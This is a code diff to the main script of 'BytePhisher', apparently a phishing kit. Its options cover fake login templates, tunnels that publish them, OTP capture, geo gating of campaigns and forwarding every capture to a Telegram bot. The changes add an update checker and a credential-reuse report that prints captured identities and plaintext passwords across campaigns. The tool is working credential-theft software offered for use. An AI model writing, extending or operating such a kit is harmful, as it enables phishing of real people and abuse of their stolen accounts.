@@ -30,15 +30,34 @@ HERE = os.path.dirname(os.path.abspath(__file__))
 if HERE not in sys.path:
     sys.path.insert(0, HERE)
 
+
+def resolve_home():
+    """Where config/templates/data live.
+
+    Order: $BYTEPHISHER_HOME → the directory this module lives in (source
+    checkout or editable install) → the current working directory. A pip-installed
+    copy inside site-packages is read-only, so we fall back to CWD instead of
+    failing when it tries to write templates/ or data/.
+    """
+    env = os.environ.get("BYTEPHISHER_HOME")
+    if env and os.path.isdir(env):
+        return os.path.abspath(env)
+    if os.path.isdir(os.path.join(HERE, "config")) or os.access(HERE, os.W_OK):
+        return HERE
+    return os.getcwd()
+
+
+HOME = resolve_home()
+
 from core import server as srv
 from core import capture as cap
 from core import templates as tpl
 from tunnels import REGISTRY as TUNNEL_REGISTRY, run_one, run_all
 
-VERSION = "1.0"
-TEMPLATES_DIR = os.path.join(HERE, "templates")
-DEFAULT_DB = os.path.join(HERE, "data", "bytephisher.db")
-CONFIG_PATH = os.path.join(HERE, "config", "config.yaml")
+VERSION = "1.0.4"
+TEMPLATES_DIR = os.path.join(HOME, "templates")
+DEFAULT_DB = os.path.join(HOME, "data", "bytephisher.db")
+CONFIG_PATH = os.path.join(HOME, "config", "config.yaml")
 
 
 # ---------------------------------------------------------------- config ----
@@ -55,7 +74,7 @@ def load_config():
     except Exception as e:
         print(f"[bytephisher] config load skipped: {e}")
     if not os.path.isabs(cfg.get("db_path", "")):
-        cfg["db_path"] = os.path.join(HERE, cfg["db_path"])
+        cfg["db_path"] = os.path.join(HOME, cfg["db_path"])
     return cfg
 
 
@@ -65,7 +84,7 @@ def load_manifest():
     man_path = os.path.join(TEMPLATES_DIR, "templates.json")
     if not os.path.isfile(man_path):
         print("[bytephisher] templates not generated yet — running generator ...")
-        sys.path.insert(0, os.path.join(HERE, "tools"))
+        sys.path.insert(0, os.path.join(HOME, "tools"))
         from gen_templates import main as gen_main
         gen_main()
     with open(man_path, encoding="utf-8") as f:
@@ -146,7 +165,11 @@ def main():
                          "tunnelers, DB) and exit")
     ap.add_argument("--web-dashboard", action="store_true", help="start Flask dashboard on :8090")
     ap.add_argument("--web-port", type=int, default=8090, help="web dashboard port")
-    ap.add_argument("--export", metavar="PATH", help="export captures to CSV and exit")
+    ap.add_argument("--export", metavar="PATH",
+                    help="export captures (.json → JSON, anything else → CSV) and exit")
+    ap.add_argument("--reuse", action="store_true",
+                    help="show credential-reuse findings (repeated identities/passwords) "
+                         "across the database and exit")
     ap.add_argument("--no-tui", action="store_true", help="print captures, no live TUI")
     ap.add_argument("--telegram", metavar="TOKEN:CHAT_ID",
                     help="send every capture to a Telegram bot chat")
@@ -190,6 +213,13 @@ def main():
     ap.add_argument("--tunnel-restart", action="store_true",
                     help="if a tunneler dies mid-campaign, bring it back automatically "
                          "(max 5 restarts each) and print the new public URL")
+    ap.add_argument("--check-update", action="store_true",
+                    help="check whether a newer BytePhisher release exists and exit")
+    ap.add_argument("--update-repo", metavar="OWNER/REPO",
+                    help="GitHub repo to check releases against (or set update_repo "
+                         "in config/config.yaml)")
+    ap.add_argument("--update-api", metavar="URL",
+                    help="explicit release API URL (testing / self-hosted)")
     ap.add_argument("--version", action="version", version=f"BytePhisher {VERSION}")
     args = ap.parse_args()
 
@@ -226,6 +256,34 @@ def main():
                               qr_url=args.qr if args.qr and args.qr != "data/qr.png" else None)
         print(f"[bytephisher] pdf written -> {res['path']} ({res['pages']} pages, "
               f"{res['rows']} submissions, {res['stats']['credentials']} credential pairs)")
+        return 0
+
+    if args.check_update:
+        from core import update as upd
+        res = upd.check_for_update(VERSION, repo=args.update_repo or cfg.get("update_repo"),
+                                   api_url=args.update_api)
+        status = res["status"]
+        if status == "update-available":
+            print(f"[bytephisher] update available: {res['latest']} (you have {VERSION})"
+                  + (f" — {res.get('url')}" if res.get("url") else ""))
+        elif status == "up-to-date":
+            print(f"[bytephisher] up to date: {VERSION} (latest {res.get('latest')})")
+        elif status == "not-configured":
+            print(f"[bytephisher] update check skipped: {res['detail']}")
+        else:
+            print(f"[bytephisher] update check failed: {res.get('detail')}")
+        return 0
+
+    if args.reuse:
+        res = db.reuse_stats()
+        print(f"[bytephisher] credential-reuse analysis (db: {cfg['db_path']})")
+        print(f"  repeated identities : {res['total_reused_identities']}")
+        for r in res["repeated_identities"][:20]:
+            print(f"    {r['identity']}  x{r['count']}  campaigns={r['campaigns'] or '-'}")
+        print(f"  repeated passwords  : {res['total_reused_passwords']}")
+        for r in res["repeated_passwords"][:20]:
+            print(f"    {r['password']!r}  x{r['count']}  "
+                  f"identities={len(r['identities'])}  campaigns={r['campaigns'] or '-'}")
         return 0
 
     if args.tunnels:
@@ -269,6 +327,18 @@ def main():
     print(f"[bytephisher] geo      : {geo}")
     print(f"[bytephisher] otp page : {'on' if otp else 'off'}")
     print(f"[bytephisher] redirect : {redirect or '(thank-you page)'}")
+
+    # --- optional update notice: cached 24h, background thread, never blocks ---
+    upd_repo = args.update_repo or cfg.get("update_repo")
+    upd_api = args.update_api or cfg.get("update_api")
+    if upd_repo or upd_api:
+        from core import update as upd
+        def _notice(res):
+            if res.get("status") == "update-available":
+                print(f"[bytephisher] NOTICE: newer release available: {res['latest']} "
+                      f"(you have {VERSION})", flush=True)
+        upd.start_background_check(HOME, VERSION, repo=upd_repo, api_url=upd_api,
+                                   on_result=_notice)
 
     # --- campaign gating (geo / time / rate) ---
     gate = None
